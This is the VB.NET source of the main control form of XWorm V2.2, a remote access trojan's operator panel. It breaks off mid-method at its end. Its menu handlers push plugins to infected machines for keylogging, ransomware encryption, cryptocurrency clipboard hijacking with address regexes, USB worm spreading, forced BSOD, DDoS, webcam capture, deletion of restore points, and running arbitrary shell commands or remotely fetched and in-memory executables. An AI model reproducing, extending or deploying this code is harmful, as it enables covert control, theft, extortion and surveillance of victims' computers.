Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports Microsoft.Win32

Public Class Form1
    Public S As Server
    Public trans As Boolean
    Public Sub New()
        InitializeComponent()
        Me.Opacity = 0
        FadeInMain(Me, 20)
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        HashG.CheckClients()
    End Sub

    Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("CLOSE")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub UPDATEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPDATEToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim open As OpenFileDialog = New OpenFileDialog

            Dim result As DialogResult = open.ShowDialog()
            If result = DialogResult.OK Then
                Try
                    Dim B As Byte() = SB("update" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Update.dll")) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(open.FileName)) & Settings.SPL & IO.Path.GetExtension(open.FileName))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If

    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("RD-")
            HashG.CheckClients()

            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub
    Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
        Try
            ToolStripStatusLabel1.Text = String.Format("Total [{0}]   Selected [{1}]   Port [{2}]   Key [{3}]   Sent [{4}]   Received [{5}]", Lv1.Items.Count.ToString, Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
            Me.Text = "XWorm V2.2" & "   " & DateTime.Now.ToLongTimeString() & "   " & "CPU " & CInt(performanceCounter1.NextValue()) & "%" & "   RAM " & CInt(performanceCounter2.NextValue()) & "%"
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
        If Settings.Online.Count > 0 Then
            Dim B As Byte() = SB("PING!")
            For Each CL As Client In Settings.Online.ToList
                Dim ClientReq As New Outcoming_Requests(CL, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
        GC.Collect()
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub BUILDERToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim f As New Builder
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub
    Private Sub Lv1_MouseMove(sender As Object, e As MouseEventArgs) Handles Lv1.MouseMove
        Try
            Dim hitInfo = Lv1.HitTest(e.Location)
            If e.Button = MouseButtons.Left AndAlso (hitInfo.Item IsNot Nothing OrElse hitInfo.SubItem IsNot Nothing) Then Lv1.Items(hitInfo.Item.Index).Selected = True
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Lv1_KeyDown(sender As Object, e As KeyEventArgs) Handles Lv1.KeyDown
        Try
            If e.Modifiers = Keys.Control AndAlso e.KeyCode = Keys.A Then
                If Lv1.Items.Count > 0 Then
                    For Each x As ListViewItem In Lv1.Items
                        x.Selected = True
                    Next
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub FormDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FormDiskToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.*)|*.*"
                    .Title = "From Disk"
                End With

                If o.ShowDialog = DialogResult.OK Then
                    Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If

            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub FromMemoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromMemoryToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.exe)|*.exe"
                    .Title = "From Memory"
                End With

                If o.ShowDialog = DialogResult.OK Then
                    Try
                        System.Reflection.Assembly.LoadFile(o.FileName).EntryPoint.GetParameters()
                    Catch
                        MessageBox.Show(o.FileName, "Is Not A .NET Assembly")
                        Return
                    End Try

                    Dim B As Byte() = SB("FM" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Memory.dll")) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub FromUrlToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromUrlToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = Interaction.InputBox("Set The Url", "From Url", urle)
            Dim fname As String = "server.exe"
            Dim str4 As String = Interaction.InputBox("Set The File Name", "File Name", fname)
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & str4 & Settings.SPL & str3)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub
    Private Sub VisibleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisibleToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim message As Object = InputBox("Enter Your Url", "Open Visible Url", "http://exmple.com")
            If Not String.IsNullOrWhiteSpace(message) Then
                Dim B As Byte() = SB("url" & Settings.SPL & message)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub NewUrlToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewUrlToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim message As Object = InputBox("Enter Your Url", "Open Invisible Url", "http://exmple.com")
            If Not String.IsNullOrWhiteSpace(message) Then
                Dim B As Byte() = SB("openhide" & Settings.SPL & message)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If

        End If
    End Sub

    Private Sub CloseToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "taskkill /im iexplore.exe /f")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub


    Private Sub RunShellToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunShellToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "cmd.exe /c calc"
            Dim str3 As String = Interaction.InputBox("Set The Command", "Run Shell", urle)
            If (str3.Length = 0) Then
            Else
                Dim B As Byte() = SB("shellfuc" & Settings.SPL & str3)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutdownToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown.exe /f /s /t 0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown.exe /f /r /t 0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogoffToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown -L")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub RunShellToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RunShellToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are You Sure?", "Invoke-BSOD!", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then

                Try

                    Dim B As Byte() = SB("BSOD" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\BSOD.dll")))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try

            End If
        End If
    End Sub

    Private Sub BotKillerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BotKillerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("bot" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Bot.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub ShowToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem1.Click
        Try
            Me.TopMost = True
            Me.WindowState = FormWindowState.Normal
            Me.TopMost = False
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem1.Click
        Try
            Process.Start(Application.ExecutablePath)
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Try
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem2.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("rec")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are You Sure?", "Uninstall!", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then
                Try

                    Dim B As Byte() = SB("uninstall" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\uninstall.dll")))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If

        End If
    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Try
            Me.TopMost = True
            Me.WindowState = FormWindowState.Normal
            Me.TopMost = False
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub FromMemoryToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromMemoryToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Script.ShowDialog()
        End If
    End Sub

    Private Sub GoogleMapsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GoogleMapsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("MapsPLU" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Maps.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DDosAttackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DDosAttackToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            DDos.ShowDialog()
        End If
    End Sub

    Private Sub BTCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BTCToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "BTC Cilpper", "Your BTC Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ETHToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ETHToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "ETH Cilpper", "Your ETH Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub XMRToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XMRToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "XMR Cilpper", "Your XMR Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(4)[a-zA-HJ-NP-Z0-9]{90,98}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub LTCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LTCToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "LTC Cilpper", "Your LTC Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,48}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DogeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DogeToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "Doge Cilpper", "Your Doge Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(D)[a-zA-HJ-NP-Z0-9]{26,35}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DashToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DashToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "Dash Cilpper", "Your Dash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub BCashToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BCashToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "BCash Cilpper", "Your BCash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(bitcoincash:|[q])[a-zA-HJ-NP-Z0-9]{26,56}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ZCashToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ZCashToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "ZCash Cilpper", "Your ZCash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "t1[0-9A-z]{33}")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub USBSpreadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles USBSpreadToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("startusb" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Worm.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub VBNetCompilerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VBNetCompilerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            VBCode.ShowDialog()
        End If
    End Sub



    Private Sub PreventSleepToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PreventSleepToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("PSleep" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\PreventSleep.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("xxx")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ppp")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ClipboardManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClipboardManagerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("cbb")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("|||")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub OpenDownloadsFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenDownloadsFolderToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & Lv1.SelectedItems(0).SubItems(2).Text) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & Lv1.SelectedItems(0).SubItems(2).Text)
                End If
                Process.Start(Application.StartupPath & "\Downloads" & "\" & Lv1.SelectedItems(0).SubItems(2).Text)
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ChangeWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeWallpaperToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
            Dim openFileDialog2 As OpenFileDialog = openFileDialog
            openFileDialog2.Title = "Select Image"
            openFileDialog2.Filter = "(*.jpg)|*.jpg"
            Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
            If flag Then
                Dim paht As String = openFileDialog.FileName
                Try
                    Dim B As Byte() = SB("WL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Wallpaper.dll")) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(paht)))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If

        End If
    End Sub

    Private Sub DeleteRestorePointsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteRestorePointsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("DelP" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\DeletePoints.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub InstalledProgramsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InstalledProgramsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PRG")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub WebCamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WebCamToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("WBCM")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("KL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Keylogger.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub



    Private Sub GetToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("KLget")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ActiveWindowsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ActiveWindowsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ACT")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub SendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendToolStripMenuItem.Click

        If Lv1.SelectedItems.Count > 0 Then
            Dim str3 As String = Interaction.InputBox("Set MessageBox", "MessageBox", "Hello World!")
            If (str3.Length = 0) Then
            Else
                Dim B As Byte() = SB("msgg" & Settings.SPL & str3)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If

    End Sub


    Private Sub FileSeacherToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileSeacherToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim f As New FileSeacher
            f.StartPosition = FormStartPosition.CenterParent
            f.ShowDialog()
        End If
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim f As New Ransomware
            f.ShowDialog()
        End If
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("RDEC" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Ransomware.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ListeningToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListeningToolStripMenuItem.Click
        Try
